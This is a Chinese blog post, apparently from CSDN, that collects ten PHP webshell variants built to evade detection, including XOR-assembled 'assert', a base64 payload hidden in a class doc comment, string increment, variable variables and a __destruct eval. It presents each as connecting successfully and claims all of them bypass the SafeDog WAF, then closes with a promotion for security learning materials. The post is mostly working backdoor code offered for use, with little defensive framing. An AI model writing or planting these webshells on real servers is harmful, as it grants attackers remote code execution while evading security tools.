# 原创
：  渗透测试 | php的webshell绕过方法汇总

# 渗透测试 | php的webshell绕过方法汇总

1.php的异或运算

```
$a="~+d()"^"!{+{}"
```

这个表示了$a=这两个字符串之间进行一个异或运算<br/> 运算异或运算符，按二进制位进行异或运算<br/> 这里的运算会把符号转化为ascii码，再转化为二进制，再转化为十进制进行运算，再把结果转化为ascii码<br/> 通过这个转换的方式来绕过检测

```
&lt;?php

$a= ("!"^"@").'ssert';

$a($_REQUEST[x]);

?&gt;
```

测试可以成功连接

#### 2.通过获取注释去绕过

```
&lt;?php



/**

* YXNzZXJ0YmZnZmc=

*/

class Example

{

public function fn()

{

}

}

通过一个空的类去获取，

$reflector = new ReflectionClass('Example'); //这里为通过反射获取类的注释



$zhushi = substr(($reflector-&gt;getDocComment()), 7, 12);//然后去截断获取注释里的字符,注意getDocComment只能通过文件最开始的类来调用才会把注释内容显示

$zhushi = base64_decode($zhushi);

$zhushi = substr($zhushi, 0, 6);



echo $zhushi;



foreach (array('_POST','_GET') as $_request) {

foreach ($$_request as $_key=&gt;$_value) {

$$_key= $_value;

}

}

/*设置一个数组，参数为_POST,_GET,然后把该数组用$_request去表示，再设置一个遍历，把$_request设为一个可变变量，再键值分离

再设$$_key=$_value，做一个定义，定义可变变量$_key键等于值得内容再设$$_key=$_value，做一个定义，定义可变变量$_key键等于值得内容

*/

$zhushi($_value);

//最后就是assert(传入的变量值)

?&gt;
```

原理就是通过把shell加密并放到注释里，利用类的反射机制获取类的注释，再解密去生成shell<br/> 测试可以成功连接

#### 3.利用字符的运算符​​​​​​​

```
&lt;?php

$__="assers";

++$__;

//echo ++$__;

$__($_REQUEST[x]);

?&gt;
```

设$__ 为字符串assers,然后对这个字符串进行自增操作，这里++是直接对这个字符串里的最后一个字符进行自增操作，得到结果为assert，然后去拼接($_REQUEST[x]);，生成shell

测试可以正常连接

```
&lt;?php eval(end($_REQUEST));?&gt;
```

#### 4.通过end函数代替[]

这里的end函数的作用是输出数组中当前元素和最后一个元素的值，这里由于传参就一个，所以就直接输出我们传参的值，从而可以传入参数，这里就是我们传入参数相当于shell里的传参

测试可以正常连接

#### 5.通过常量去绕过

```
&lt;?php define("a","$_GET[1]");eval(a);?&gt;
```

这里的关键在于define函数，这个函数的作用是定义一个常量<br/> 我们这里设置一个常量为a，它的值是$_GET[1]，然后再去eval执行常量a，实际就是eval($_GET[1]);,从而达到绕过的目的

测试可以正常连接

#### 6.字符串拼接+双美元符​​​​​​​

```
&lt;?php

$a='ass';

$b='ert';

$funcName=$a.$b;

$x='funcName';

$$x($_REQUEST[1]);

?&gt;
```

这里通过把关键的assert进行分割，然后拼接，然后通过$$,利用可变变量去执行

测试可以正常连接

#### 7.通过函数定义绕过

```
&lt;?php

function a($a){

return $a;}

eval(a($_REQUEST)[1]);

?&gt;
```

这里设置一个用户自定义函数a,当里面有参数时，返回该参数的内容，这里shell里的<br/> a($_REQUEST)[1] 的实际效果为 a($_REQUEST),相当于是a($a)，会返回$a的内容，结果为<br/> $_REQUEST，最后一行的实际内容为eval($_REQUEST[1]);

测试可以正常连接

#### 8.通过类定义，然后传参分割​​​​​​​

```
&lt;?php



class User

{

public $name = '';

function __destruct(){

eval("$this-&gt;name");

}

}

$user = new User;

$user-&gt;name = ''.$_REQUEST[1];

?&gt;
```

通过类定义，定义一个类User,设置$name为空，然后设置一个析构函数，脚本运行结束之前会调用对象，然后eval去执行,后面用new函数将对象实例化并输出方法，<br/> 然后，$user-&gt;name这个相当于是$this-&gt;name，等于’’.$_REQUEST[1];<br/> 最后$user-&gt;name = ‘’.$_REQUEST[1]; 相当于eval($_REQUEST[1])

测试可以正常连接

#### 9.多传参方式绕过​​​​​​​

```
&lt;?php

$COOKIE = $_COOKIE;

foreach($COOKIE as $key =&gt; $value){

if($key=='assert'){

$key($_REQUEST['s']);

}

}

?&gt;
```

这里设置$cookie为获取的cookie传参，这里是个数组，然后通过foreach遍历，再进行键值分离，$key为键，$value为值，然后进行一个if判断，当$key为assert时，$key拼接($_REQUEST[‘s’]); 达到生成shell效果

测试可以正常连接

#### 10.通过get_defined_functions绕过

```
&lt;?php

$a=get_defined_functions();

$a['internal'][841]($_GET['a']);

?&gt;
```

这个get_defined_functions函数作用是返回所有已定义的函数，包括内置函数和用户定义的函数，这里通过get_defined_functions得到所有函数，然后通过[‘internal’][841]去访问并调用相应函数，然后后接($_GET[‘a’])，生成shell

测试可以正常连接

用安全狗进行检测

<br/> 以上方案里的均能过安全狗

关于webshell绕过其实还有许多其他的办法，后续学习到了新方法会继续在本文上做补充

**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/24df7b5a349240aea601c9fae08c4132.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/bbefb59db1134d1b9875e4e84be6f1ba.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/bfc5e6ab43c349dca37ab64143aa7f88.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/45ffc0c978a940b6bc6882545e1a7e63.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/96180f1939ae40fe919306efe5dacfd8.png" width="665"/>

应急响应笔记

学习路线
